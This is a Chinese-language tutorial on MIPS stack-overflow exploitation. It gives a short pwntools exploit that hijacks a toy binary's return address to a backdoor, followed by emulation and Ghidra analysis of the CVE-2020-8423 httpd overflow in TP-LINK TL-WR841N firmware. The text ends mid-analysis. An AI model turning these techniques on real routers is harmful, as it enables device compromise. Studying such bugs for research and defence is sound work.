    $ python setup.py install
    $ ROPgadget
**[Mipsrop](https://github.com/tacnetsol/ida/blob/master/plugins/mipsrop/mipsrop.py)**
将下载好的python脚本放入ida的plugins目录
    https://github.com/tacnetsol/ida/blob/master/plugins/mipsrop/mipsrop.py
    https://github.com/SeHwa/mipsrop-for-ida7 #ida7
## MIPS指令集
**简介：MIPS**
是一种采取精简指令集（RISC）的指令集架构，是一种高性能的嵌入式CPU架构，广泛被使用在许多电子产品、网络设备、个人娱乐设备与商业设备上（比如龙芯），在路由器领域也被广泛应用。
**Mips常用命令**
命令 | 格式 | 用途  
---|---|---  
lw | lw R1, 0(R2) | 从存储器中读取一个word存储（Load）到register中  
sw | sw R1, 0(R2) | 把一个word从register中存储（store）到存储器中  
addiu | addiu R1,R2,#3 | 将一个立即数#3加上R2内容之后存放到目标地址R1  
or | or R1,R2,R3 | 两个寄存器内容相或  
jalr | jalr R1 | 使用寄存器的跳转指令  
这里只列举了部分比较典型的几类指令，不过已经足够理解Mips的栈溢出了。
**Mips下寄存器的功能**
REGISTER | NAME | USAGE  
---|---|---  
`$0` | `$zero` | 常量0(constant value 0)  
`$1` | `$at` | 保留给汇编器(Reserved for assembler)  
`$2-$3` | `$v0-$v1` | 函数调用返回值(values for results and expression evaluation)  
`$4-$7` | `$a0-$a3` | 函数调用参数(arguments)  
`$8-$15` | `$t0-$t7` | 暂时的(或随便用的)  
`$16-$23` | `$s0-$s7` | 保存的(或如果用，需要SAVE/RESTORE的)(saved)  
`$24-$25` | `$t8-$t9` | 暂时的(或随便用的)  
`$28` | `$gp` | 全局指针(Global Pointer)  
`$29` | `$sp` | 堆栈指针(Stack Pointer)  
`$30` | `$fp` | 帧指针(Frame Pointer)  
`$31` | `$ra` | 返回地址(return address)  
**MIPS特点：**
  * MIPS和MIPSEL是两种架构MIPS是大端序、MIPSEL是小端序。一般来说大端序列是主流的（和x86和arm相反），不过很多CTF题目都是小端序的。（大端调试需要在gdb和pwntools都特别设置，否则默认小端）
  * 不支持NX（即使编译选项添加了也没有用）不支持NX即函数的栈/bss都是可执行的，当我们的写入栈中的shellcode能够被执行，大大降低了利用难度。
  * 叶子函数和非叶子函数 
    * 在MIPS体系架构下，函数分为叶子函数和非叶子函数。MIPS函数的调用过程与x86不同，x86中函数A调用函数B时，会将A函数的地址压入堆栈中，等到函数B执行完毕返回A函数时候，再从堆栈中弹出函数A的地址。而MIPS中，如果是 **叶子函数** ，与x86是不同的，函数的返回地址是不会压入栈中的，而是会直接存入寄存器 **$ra** 中。如果是 **非叶子函数（即函数中还调用了其他函数）** ，则和x86类似，将地址存入栈中。
    * 另外Mips是没有栈底指针的，只有一个$sp指向栈顶，并且不会像x86那样通过pop或者push调整指针，而是采用 **偏移寻址** 来访问变量。非叶子函数如图所示，在函数头部会将调用函数的返回地址即 **$ra** 存放在栈底（偏移4字节），而在函数快结束时会重新将该值取去出来，放入ra。在这个间段内，如果覆盖了函数栈底，就能够控制程序的流程。
​ 而在叶子函数如下图所示，从函数被调用开始到函数jr ra返回调用函数，数据一直都在 **$ra**
寄存器中，所以理论上是无法利用的。但是如果缓冲区溢出的足够多，足够越过本函数的栈底，直到覆盖到调用函数的栈底，那么也是能够利用的。
  * 内存中的数据访问（store/load）必须严格对齐（至少4字节）
  * **流水线效应** ：本应顺序执行的几条指令同时执行，只不过处于不同的执行阶段（一般指令执行阶段包括：取指、间指、执行、中断）如下图所示，参考二次重叠执行方式，第一条指令在执行时候，第二条指令在分析，第三条指令在取指。举个栗子，流水线会在跳转指令(jal)导致 **分支延迟效应** ，任何一个分支跳转语句后面的那条语句叫做 **分支延迟槽** 。当它刚把要跳转到的地址填充好还没完成本条指令时，分支语句后面的那个指令（第三条指令）就执行了。所以下面strrchr函数的参数(`$a0`)实际上来自于`$0` 而不是来自于`$2`。这是在看Mips汇编的时候需要注意的。 
        mov $a0,$s2
    jalr strrchr   //arg $a0
    mov $a0,$s0
  * **缓存不一致性（cache incoherency）：** 指令Cache和数据Cache两者的同步需要一个时间来同步。需要调用Sleep来让shellcode从数据Cache刷新到指令Cache，否则会执行失败，不能像x86架构下直接跳转到shellcode，而是需要构造一条ROP链接，先调用sleep，然后在跳转到shellcode。
**栈溢出实例**
还是用我们一开始的vuln程序进行溢出
qemu运行
    qemu-mipsel -g 9000 vuln aaaaaa
gdb远程调试
    $ qemu-mipsel -g 9000 vuln
    $  gdb-multiarch -q
    (gdb) target remote 127.0.0.1:9000
对has_stack函数下断点。首先查看strcpy的两个参数，首先是strcpy的src，`lw
a1,56(s8)`即从s8寄存器（实际上值和sp是相同的，都是指向栈顶）数据偏移56（+56）的数据写入寄存器a1，即通过s8+56偏移可以获得地址0x76fff2c7，这个地址即存放我输入的aaaa数据。然后我们来看dest，即发生写入的地址，这个参数默认被放在a0里，即s8偏移24位。这样我们就能够计算需要多少数据能覆盖缓冲区了。
然后让我们运行到strcpy结束，能够看到我们写入的数据（sp偏移24）。而我们知道返回地址是sp偏移4位，因为这条汇编代码 `004003e8 34 00
bf af sw ra,local_4(sp)`，所以我们只需要写入20+4字节数据就能覆盖返回地址。
即下图所示的位置。
经过实际测试我们输入28+4个字节能够覆盖到返回地址，下图中也显示程序的流程被我们所控制。
接下来让我们写一个简单的exploit，运行exp就能获得shell（不过不是qemu里面的shell，而是系统的shell，这点很奇怪，也许是qemu用户模式并没有挂文件系统和内核的缘故）
    from pwn import *
    context.binary = "vuln"
    back_door=0x0400390
    payload=p32(0x12345678)*7+p32(back_door)
    print(payload)
    io=process(argv=["qemu-mipsel", "./vuln" , payload])
    #context.log_level='Debug'
    io.interactive()
这里贴上一个链接，方便指令集查阅
## CVE-2020-8423
漏洞设备：TP-LINK TL-WR841N V10
漏洞原因：栈溢出
> CVE-2020-8423是TP-LINK路由器中http服务在解析用户HTTP头中字符串没有设置正确的缓冲区大小而导致的栈溢出。
###  配置运行环境
因为手头没有真机，所以我们选择用qemu来模拟路由器。
**Qemu System模式运行**
首先下载路由器对应版本的[固件](https://www.tp-link.com/no/support/download/tl-wr841n/v10/),然后使用binwalk对固件进行解压。
    binwalk -Me TL-WR841N_V10_150310.zip
    cd _TL-WR841N_V10_150310.zip.extracted/_wr841nv10_wr841ndv10_en_3_16_9_up_boot\(150310\).bin.extracted/squashfs-root/
首先我们需要桥接qemu，使得我们能够传输我们的文件系统squashfs-root到虚拟机中。这部分比较麻烦而且容易忘记，所以记录一下。启动系统用下面的命令就可以了(这个固件是32位的，请不要用64位qemu运行)。如果启动不起来或者很慢，重新下一下qcow2，可能之前的某些操作把镜像弄坏了。
    sudo qemu-system-mips -M malta -kernel /home/migraine/Documents/vmlinux-2.6.32-5-4kc-malta -hda /home/migraine/Documents/debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic, -net tap -nographic 
    #更换内核(wget https://people.debian.org/\~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta)
    sudo qemu-system-mips -M malta -kernel /home/migraine/Documents/vmlinux-3.2.0-4-4kc-malta -hda /home/migraine/Documents/debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic, -net tap -nographic
    映射端口 -redir tcp:80::8080
**配置桥接**
我们需要将文件系统传入虚拟机中然后运行固件，为了能让qemu和宿主机传输文件，先要配置桥接网络([参考链接](https://www.cnblogs.com/pengdonglin137/p/5023340.html))
1.配置桥接网卡
安装bridge-utils和uml-utilities
    sudo apt-get  install bridge-utils
    sudo apt-get install uml-utilities
然后修改/etc/network/interfacces为
    auto lo
    iface lo inet loopback
    auto eth0
    iface eth0 inet manual
    up ifconfig eth0 0.0.0.0 up
    auto br0
    iface br0 inet dhcp
    bridge_ports eth0
    bridge_stp off
    bridge_maxwait 1
编辑/etc/qemu-ifup，使qemu在启动中自动将网卡(Default:tap0/tap1)加入到桥接网卡。这是关键的一步。
    #!/bin/sh
    echo "Executing /etc/qemu-ifup"
    echo "Bringing up $1 for bridged mode..."
    sudo /sbin/ifconfig $1 0.0.0.0 promisc up
    echo "Adding $1 to br0..."
    sudo /sbin/brctl addif br0 $1
    #sudo ifconfig br0 10.211.55.6/24
    sleep 3
重启后我们主机的ip会多一个桥接。
2.配置桥接网卡的地址
接着让我们设置桥接的地址。比如我目前宿主机（运行在parralell下）的地址是10.211.55.5，所以我使用命令 `ifconfig br0
10.211.55.6/24 up` 修改桥接网卡(或者在etc/qemu-ifup中加上`sudo ifconfig br0
10.211.55.6/24` ，这样只要qemu开启就会自动设置br0)。
然后我们在qemu中也用ifconfig设置ip为10.211.55.7/24，这样宿主机和qemu就能够相互ping通了。（只要在同一网段即可）
    #在虚拟机内部
    ifconfig eth0 10.211.55.7/24 up
    #在虚拟机外部(设置桥接)
    ifconfig br0 10.211.55.6/24 up
**需要注意的是：要保证qemu内的ip子网掩码和桥接网卡一致，否则虽然宿主机和qemu都可以访问桥接网卡，但是两者不能相互通信。**
尝试去ping宿主机。然后通过scp来传输文件。
    root@debian-mips:~# ifconfig eth0 10.211.55.7/24 up
    root@debian-mips:~# ifconfig
    eth0      Link encap:Ethernet  HWaddr 00:0c:29:ee:39:39  
              inet addr:10.211.55.6  Bcast:10.211.55.255  Mask:255.255.255.0
              inet6 addr: fe80::20c:29ff:feee:3939/64 Scope:Link
              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
              RX packets:0 errors:0 dropped:0 overruns:0 frame:0
              TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000 
              RX bytes:0 (0.0 B)  TX bytes:2862 (2.7 KiB)
              Interrupt:10 Base address:0x1020
    #将文件系统传入qemu虚拟机
    scp -r squashfs-root/ root@10.211.55.7:~/
传输文件，然后在qemu中就能看到我们传输的文件了。
    sshpass -p root  scp -r squashfs-root/ root@10.211.55.7:~/
**挂载固件的文件系统**
挂载系统的proc到我们固件目录下的[proc](https://zhuanlan.zhihu.com/p/26923061).这样我们的程序在访问一些内核信息时候能够读取到，否则程序可能会运行错误。
    # 挂载文件系统
    mount --bind /proc squashfs-root/proc
    # 更换root目录
    chroot . bin/sh
     /usr/bin/httpd
运行会报很多错误，参考H4lo师傅的方法hook一下函数来解决问题。将我们编译好的链接库通过scp传入到Qemu虚拟机中。
    #mips-linux-gnu-gcc -shared -fPIC hook.c -o hook
    #include
    #include
    int system(const char *command){
        printf("HOOK: system(\"%s\")",command);
        return 1337;
    }
    int fork(void){
        return 1337;
    }
重新运行，遇到`/usr/bin/httpd: can't load library 'libc.so.6`这种问题，使用软链接解决即可。
    # 挂载文件系统
    $ mount --bind /proc squashfs-root/proc
    # 更换root目录
    $    cd squashfs-root/
    $ chroot . bin/sh
    $ LD_PRELOAD="/hook" /usr/bin/httpd
    $ /usr/bin/httpd: can't load library 'libc.so.6'
    $ ln -s  libc.so.0  libc.so.6
    $ LD_PRELOAD="/hook" /usr/bin/httpd
    #gdb调试
    export LD_PRELOAD="/hook"
    #./gdbserver-7.12-mips-be 0.0.0.0:2333  /usr/bin/httpd #这个版本的gdb挂起有点问题
    ./gdbserver.mipsbe  0.0.0.0:2333  /usr/bin/httpd
进入Web后台界面时候，登陆账号（账号密码都是admin）
**其他问题**
  * 设置桥接之后主机无法联网的问题初始化网桥时候将dns给删了,添加一下dns即可。修改文件 **/etc/resolvconf/resolv.conf.d/base**
        nameserver 8.8.8.8
    nameserver 8.8.4.4
执行更新
        resolvconf -u
  * ssh或者scp报错`Unable to negotiate with 10.211.55.8 port 22: no matching host key type found. Their offer: ssh-dss`添加参数`-oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1`,比如： 
        $ ssh [PI:EMAIL](mailto:PI:EMAIL).8 -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1
    $ sshpass -p root  scp -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1 gdbserver-7.12-mips-be [PI:EMAIL](mailto:PI:EMAIL).8:~/
**gdb调试**
使用scp将gdbserver拷贝到squashfs-root目录下
    scp r gdbserver.mipsbe root@10.211.55.7:~/squashfs-root/
使用gdbserver将httpd调试转发到2333端口
    export LD_PRELOAD="/hook"
    ./gdbserver-7.12-mips-be 0.0.0.0:2333  /usr/bin/httpd
宿主机的gdb通过remote target进行远程调试。如果报错`Remote replied unexpectedly to
'vMustReplyEmpty': timeout`。需要将内核版本从vmlinux-2.6.32-5-4kc-malta更换为[vmlinux-3.2.0-4-4kc-malta](//people.debian.org/%5C~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta)
###  漏洞分析
用Ghidra逆向分析 _/usr/bin/httpd_ 文件, **stringModify**
包含三个参数，分别是dst、len、src，很明显是拷贝函数。经过分析可以知道stringModify主要用于拷贝string并且对其进行一定的过滤，包括对转义字符的修改，对于\r和\n的转义等。但是函数并没有包含对dst的检查，以及对len的限制，如果使用者dst创建的过小就有可能产生栈溢出ou。（就相当于一个对字符有一定转义作用的strcpy）
当然，还有一个最有趣，并且直接导致漏洞的是，生成``的时候，写入了4个字节的数字，但是记录长度的iVar3变量却只加了1，导致理论上我们能够输入len长度4倍大数据，这样能够直接对任何调用stringModify的函数产生缓冲区溢出。
参考poc中输入 _/%0A_ （或者 _/%0D_
）会而页面会输出`\/`，(0x0a对应\n,0x0d对应\r)，可见我们出触法了生成``的代码。下面是这段代码经过stringModify转义分析。
**注意代码中只对单独存在的`\n`进行转义（连续的\n并不会触发这个漏洞点），这就是为什么我们输入的\n之间需要用其他符号隔开（经过实验证明，把\换成`  
    int stringModify(char *dst,int len,int src)